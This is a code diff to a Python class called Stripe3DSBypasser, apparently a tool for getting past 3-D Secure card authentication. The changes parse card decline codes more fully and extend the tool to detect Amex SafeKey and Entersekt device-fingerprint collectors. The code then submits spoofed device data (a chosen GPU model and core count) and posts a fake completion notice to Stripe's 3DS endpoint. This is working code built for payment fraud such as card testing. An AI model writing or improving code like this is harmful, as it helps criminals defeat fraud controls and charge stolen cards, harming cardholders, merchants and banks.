@@ -200,12 +200,20 @@ class Stripe3DSBypasser:
                             if vstat in ("succeeded", "complete", "requires_capture"):
                                 return {'success': True, 'status': vstat, 'raw_response': vj}
                             elif vstat == "requires_payment_method":
-                                verr = vpi.get("last_payment_error") or {}
+                                verr = (
+                                    vpi.get("last_payment_error")
+                                    or vpi.get("last_setup_error")
+                                    or vj.get("last_payment_error")
+                                    or vj.get("error")
+                                    or {}
+                                )
+                                real_code = verr.get('decline_code') or verr.get('code') or 'card_declined'
+                                real_msg = verr.get('message') or f"Card declined ({real_code})"
                                 return {
                                     'success': False,
                                     'status': 'declined',
-                                    'decline_code': verr.get('decline_code') or 'declined_after_waf',
-                                    'error': verr.get('message', 'Declined after WAF verification'),
+                                    'decline_code': real_code,
+                                    'error': real_msg,
                                     'raw_response': vj
                                 }
                             elif vstat in ("requires_action", "requires_source_action"):
@@ -244,14 +252,23 @@ class Stripe3DSBypasser:
                     },
                     timeout=8,
                 ) as r:
-                    # Handle ACS device fingerprint collectors (Entersekt / Cardinal / similar)
+                    # Handle ACS device fingerprint collectors (Entersekt / SafeKey / Cardinal)
                     try:
                         method_html = r.text() if callable(r.text) else r.text
-                        if method_html and "devicefingerprint" in method_html.lower():
+                        if method_html:
                             import re as _re
+                            device_fp_url = None
+                            # 1. Cardinal / standard wrapper check
                             m = _re.search(r'submitDataAndForm\(["\']+(https://[^"\']+/devicefingerprint)["\']', method_html)
                             if m:
                                 device_fp_url = m.group(1)
+                            # 2. Amex SafeKey / Entersekt direct form check
+                            elif 'safekey' in method_html.lower() or 'deviceidentification' in method_html.lower():
+                                m_action = _re.search(r'<form[^>]+action=["\']+(https://[^"\']+)["\']', method_html, _re.I)
+                                if m_action:
+                                    device_fp_url = m_action.group(1)
+
+                            if device_fp_url:
                                 h = hashlib.sha256(server_trans_id.encode()).hexdigest()
                                 gpu_choice = _GPU_POOL[int(h[16:18], 16) % len(_GPU_POOL)]
                                 _cores = (4, 8, 12, 16)
@@ -273,6 +290,18 @@ class Stripe3DSBypasser:
                                     timeout=8,
                                 ) as _:
                                     pass
+
+                        # Complete method notification to Stripe
+                        try:
+                            notif_body = {"threeDSMethodData": method_data_b64}
+                            async with session.post(
+                                "https://hooks.stripe.com/3ds2/fingerprint/complete",
+                                data=urlencode(notif_body),
+                                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                timeout=6
+                            ) as _: pass
+                        except Exception:
+                            pass
                     except Exception:
                         pass
             except Exception:
